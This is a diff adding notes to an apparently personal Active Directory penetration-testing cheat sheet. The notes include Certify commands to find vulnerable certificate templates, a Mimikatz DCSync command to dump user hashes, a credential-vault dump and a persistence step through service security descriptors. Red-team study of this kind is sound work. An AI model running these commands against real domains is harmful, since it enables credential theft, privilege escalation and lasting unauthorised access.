@@ -37,9 +37,16 @@ AS-REP Roasting:
 Get-DomainUser -PreauthNotRequired -verbose
 . .\ASREPRoast\ASREPRoast.ps1
 Invoke-ASREPRoast -verbose
- 
-<strong>
-</strong></code></pre>
+
+Check if AD CS is running
+Certify.exe cas
+Certify.exe find
+Certify.exe find /vulnerable
+Certify.exe find /enrolleeSuppliesSubject
+
+Start hfs
+Share all tools
+</code></pre>
 
 
 
@@ -82,9 +89,12 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Gro
 ```
 {% endcode %}
 
+**Domain Admin creds available**&#x20;
 
-
-
+```powershell
+DCSync so you can get Hashes of all users you want
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dom\account-you-want-hash"'
+```
 
 ### New Computer
 
@@ -96,13 +106,23 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"
 
 **Dump creds from credential vault (Scheduled Tasks)**
 
-```powershell
+```markup
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
 
 **Unconstrained delegation of the machine and domain admin connects to that machine?**
 
 **If we have Trusts, get Enterprise Admin with authenitcation of dc of the forest to authenticate to us.**
+
+
+
+**Persistence: (Local Admin needed) Modify security descriptors of services to access the services without administrative privileges**
+
+{% code overflow="wrap" %}
+```powershell
+Set-RemotePSRemoting –SamAccountName yoususername -ComputerName targethost -Verbosewershe
+```
+{% endcode %}
 
 
 
